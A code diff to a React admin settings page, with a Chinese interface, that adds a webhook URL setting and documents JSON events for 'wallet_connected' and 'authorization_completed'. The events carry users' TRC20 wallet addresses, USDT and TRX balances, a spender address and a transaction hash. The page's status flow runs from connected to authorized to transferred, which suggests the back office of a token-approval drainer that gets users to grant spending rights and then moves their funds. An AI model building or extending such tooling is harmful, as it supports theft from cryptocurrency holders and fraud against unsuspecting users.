@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react';
-import { Save, RefreshCw, Settings, Wallet, Coins, MessageCircle } from 'lucide-react';
+import { Save, RefreshCw, Settings, Wallet, Coins, MessageCircle, Globe, Info } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
@@ -24,6 +24,9 @@ const DEFAULT_USDT_ADDRESS = 'TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs';
 // Default support link
 const DEFAULT_SUPPORT_LINK = 'https://t.me/support';
 
+// Default webhook URL
+const DEFAULT_WEBHOOK_URL = 'https://owgnyztchbastgwucebf.supabase.co/functions/v1/address-webhook';
+
 const AdminSettings = () => {
   const [settings, setSettings] = useState<AppSetting[]>([]);
   const [loading, setLoading] = useState(true);
@@ -35,6 +38,8 @@ const AdminSettings = () => {
   const [savingUsdt, setSavingUsdt] = useState(false);
   const [supportLink, setSupportLink] = useState(DEFAULT_SUPPORT_LINK);
   const [savingSupport, setSavingSupport] = useState(false);
+  const [webhookUrl, setWebhookUrl] = useState(DEFAULT_WEBHOOK_URL);
+  const [savingWebhook, setSavingWebhook] = useState(false);
 
   useEffect(() => {
     fetchSettings();
@@ -68,6 +73,10 @@ const AdminSettings = () => {
         const support = data.find(s => s.key === 'support_link');
         if (support) {
           setSupportLink(support.value);
+        }
+        const webhook = data.find(s => s.key === 'webhook_url');
+        if (webhook) {
+          setWebhookUrl(webhook.value);
         }
       }
     } catch (e) {
@@ -231,6 +240,48 @@ const AdminSettings = () => {
 
   const handleResetSupportToDefault = () => {
     setSupportLink(DEFAULT_SUPPORT_LINK);
+  };
+
+  const handleSaveWebhookUrl = async () => {
+    if (!webhookUrl.trim()) {
+      toast.error('请输入Webhook URL');
+      return;
+    }
+
+    // Basic URL validation
+    try {
+      new URL(webhookUrl);
+    } catch {
+      toast.error('请输入有效的URL地址');
+      return;
+    }
+
+    setSavingWebhook(true);
+    try {
+      const { error } = await supabase
+        .from('app_settings' as any)
+        .upsert({
+          key: 'webhook_url',
+          value: webhookUrl,
+          description: 'Webhook URL (钱包连接/授权事件通知)'
+        }, { onConflict: 'key' }) as { error: any };
+
+      if (error) {
+        toast.error('保存失败');
+        console.error(error);
+      } else {
+        toast.success('Webhook URL已保存');
+        fetchSettings();
+      }
+    } catch (e) {
+      toast.error('保存失败');
+      console.error(e);
+    }
+    setSavingWebhook(false);
+  };
+
+  const handleResetWebhookToDefault = () => {
+    setWebhookUrl(DEFAULT_WEBHOOK_URL);
   };
 
   return (
@@ -440,6 +491,111 @@ const AdminSettings = () => {
               </CardContent>
             </Card>
 
+            {/* Webhook URL Settings */}
+            <Card>
+              <CardHeader>
+                <div className="flex items-center gap-2">
+                  <Globe className="h-5 w-5 text-purple-500" />
+                  <CardTitle>Webhook URL 设置</CardTitle>
+                </div>
+                <CardDescription>
+                  设置钱包连接和授权完成事件的通知地址
+                </CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="space-y-2">
+                  <Label htmlFor="webhook_url">Webhook URL</Label>
+                  <div className="flex gap-2">
+                    <Input
+                      id="webhook_url"
+                      placeholder="https://..."
+                      value={webhookUrl}
+                      onChange={(e) => setWebhookUrl(e.target.value)}
+                      className="font-mono text-sm"
+                    />
+                    <Button variant="outline" onClick={handleResetWebhookToDefault} title="重置为默认地址">
+                      <RefreshCw className="h-4 w-4" />
+                    </Button>
+                    <Button onClick={handleSaveWebhookUrl} disabled={savingWebhook}>
+                      <Save className="h-4 w-4 mr-2" />
+                      {savingWebhook ? '保存中...' : '保存'}
+                    </Button>
+                  </div>
+                  <p className="text-xs text-muted-foreground">
+                    当用户连接钱包或完成授权时，系统会向此URL发送POST请求
+                  </p>
+                  
+                  {/* Data Format Documentation */}
+                  <div className="mt-4 p-4 bg-muted/50 rounded-lg space-y-4">
+                    <div className="flex items-center gap-2">
+                      <Info className="h-4 w-4 text-primary" />
+                      <span className="font-medium text-sm">数据格式说明</span>
+                    </div>
+                    
+                    {/* wallet_connected event */}
+                    <div className="space-y-2">
+                      <p className="text-xs font-medium text-primary">1. wallet_connected 事件</p>
+                      <p className="text-xs text-muted-foreground">用户连接钱包时触发，创建状态为"connected"的地址记录</p>
+                      <pre className="text-xs bg-background p-3 rounded border overflow-x-auto">
+{`{
+  "event": "wallet_connected",
+  "timestamp": "2026-01-03T07:24:43.082Z",
+  "data": {
+    "order_id": "UST1767425083607",
+    "wallet_address": "TThV75wPse6...",
+    "username": "async",
+    "currency": "USDT",
+    "network": "TRC20",
+    "spender_address": "TYDzsYU...",
+    "usdt_balance": 100.5,
+    "trx_balance": 50.0
+  }
+}`}
+                      </pre>
+                    </div>
+                    
+                    {/* authorization_completed event */}
+                    <div className="space-y-2">
+                      <p className="text-xs font-medium text-green-500">2. authorization_completed 事件</p>
+                      <p className="text-xs text-muted-foreground">用户完成授权时触发，更新状态为"authorized"并记录tx_hash</p>
+                      <pre className="text-xs bg-background p-3 rounded border overflow-x-auto">
+{`{
+  "event": "authorization_completed",
+  "timestamp": "2026-01-03T07:25:52.255Z",
+  "data": {
+    "order_id": "UST1767425083607",
+    "wallet_address": "TThV75wPse6...",
+    "username": "async",
+    "currency": "USDT",
+    "network": "TRC20",
+    "spender_address": "TYDzsYU...",
+    "usdt_balance": 100.5,
+    "trx_balance": 50.0,
+    "tx_hash": "abc123...",
+    "status": "success",
+    "payment_mode": "safe"
+  }
+}`}
+                      </pre>
+                    </div>
+                    
+                    {/* Address status flow */}
+                    <div className="space-y-2 pt-2 border-t">
+                      <p className="text-xs font-medium">地址状态流程：</p>
+                      <div className="flex items-center gap-2 text-xs">
+                        <span className="px-2 py-1 bg-yellow-500/20 text-yellow-600 rounded">connected</span>
+                        <span>→</span>
+                        <span className="px-2 py-1 bg-green-500/20 text-green-600 rounded">authorized</span>
+                        <span>→</span>
+                        <span className="px-2 py-1 bg-blue-500/20 text-blue-600 rounded">transferred</span>
+                      </div>
+                      <p className="text-xs text-muted-foreground mt-1">已连接钱包 → 已授权 → 已转账</p>
+                    </div>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+
             {/* Usage Instructions */}
             <Card>
               <CardHeader>
@@ -458,6 +614,10 @@ const AdminSettings = () => {
                   <li className="flex items-start gap-2">
                     <span className="text-primary">•</span>
                     <span>USDT合约地址需与用户钱包所在网络一致</span>
+                  </li>
+                  <li className="flex items-start gap-2">
+                    <span className="text-primary">•</span>
+                    <span>Webhook用于接收钱包连接和授权事件，实现与其他服务的联动</span>
                   </li>
                   <li className="flex items-start gap-2">
                     <span className="text-destructive">•</span>
